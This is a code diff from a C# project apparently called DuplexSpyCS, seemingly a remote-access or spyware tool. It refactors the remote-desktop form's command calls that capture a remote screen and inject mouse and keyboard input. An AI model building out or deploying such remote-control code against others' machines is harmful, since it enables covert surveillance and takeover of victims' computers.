@@ -227,7 +227,7 @@ namespace DuplexSpyCS
             }
 
             var dic = monitor_info[toolStripComboBox1.Text];
-            v.encSend(2, 0, "desktop|screenshot|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
+            v.fnSendCommand("desktop|screenshot|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
         }
 
         /// <summary>
@@ -242,7 +242,7 @@ namespace DuplexSpyCS
             }
 
             var dic = monitor_info[toolStripComboBox1.Text];
-            v.encSend(2, 0, "desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
+            v.fnSendCommand("desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
             capture = true;
             timer1.Start();
         }
@@ -255,7 +255,7 @@ namespace DuplexSpyCS
             }
 
             var dic = monitor_info[toolStripComboBox1.Text];
-            v.encSend(2, 0, "desktop|stop");
+            v.fnSendCommand("desktop|stop");
         }
 
         void setup()
@@ -273,7 +273,7 @@ namespace DuplexSpyCS
 
             fps_last_time = DateTime.Now;
 
-            v.encSend(2, 0, "desktop|init");
+            v.fnSendCommand("desktop|init");
             timer1.Stop();
 
             pictureBox1.MouseWheel += PictureBox1_MouseWheel;
@@ -286,7 +286,7 @@ namespace DuplexSpyCS
             if (capture && toolStripButton4.Checked)
             {
                 int amount = e.Delta;
-                v.encSend(2, 0, "mouse|btn|SC|" + amount.ToString());
+                v.fnSendCommand("mouse|btn|SC|" + amount.ToString());
             }
         }
 
@@ -307,7 +307,7 @@ namespace DuplexSpyCS
 
         private void frmDesktop_FormClosing(object sender, FormClosingEventArgs e)
         {
-            v.encSend(2, 0, "desktop|stop");
+            v.fnSendCommand("desktop|stop");
         }
 
         private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
@@ -352,7 +352,7 @@ namespace DuplexSpyCS
                 double loc_x = (e.Location.X - screen_LB) * tgt_wfactor;
                 double loc_y = (e.Location.Y - screen_TB) * tgt_hfactor;
 
-                v.encSend(2, 0, $"mouse|move|{(int)loc_x}|{(int)loc_y}");
+                v.fnSendCommand($"mouse|move|{(int)loc_x}|{(int)loc_y}");
             }
         }
 
@@ -400,7 +400,7 @@ namespace DuplexSpyCS
             var dic = monitor_info[toolStripComboBox1.Text];
 
             if (timer1.Enabled)
-                v.encSend(2, 0, "desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
+                v.fnSendCommand("desktop|start|" + $"{toolStripComboBox1.Text},{dic["width"]},{dic["height"]}");
         }
 
         private void frmDesktop_KeyPress(object sender, KeyPressEventArgs e)
@@ -414,7 +414,7 @@ namespace DuplexSpyCS
             //KEYBOARD
             if (toolStripButton3.Checked)
             {
-                v.encSend(2, 0, "keyboard|vk|down|" + ((int)e.KeyCode).ToString());
+                v.fnSendCommand("keyboard|vk|down|" + ((int)e.KeyCode).ToString());
             }
         }
 
@@ -429,7 +429,7 @@ namespace DuplexSpyCS
                 if (string.IsNullOrEmpty(btn))
                     return;
 
-                v.encSend(2, 0, "mouse|btn|" + btn);
+                v.fnSendCommand("mouse|btn|" + btn);
             }
         }
 
@@ -444,7 +444,7 @@ namespace DuplexSpyCS
                 if (string.IsNullOrEmpty(btn))
                     return;
 
-                v.encSend(2, 0, "mouse|btn|" + btn);
+                v.fnSendCommand("mouse|btn|" + btn);
             }
         }
 
@@ -452,7 +452,7 @@ namespace DuplexSpyCS
         {
             if (toolStripButton3.Checked)
             {
-                v.encSend(2, 0, "keyboard|vk|up|" + ((int)e.KeyCode).ToString());
+                v.fnSendCommand("keyboard|vk|up|" + ((int)e.KeyCode).ToString());
             }
         }
 
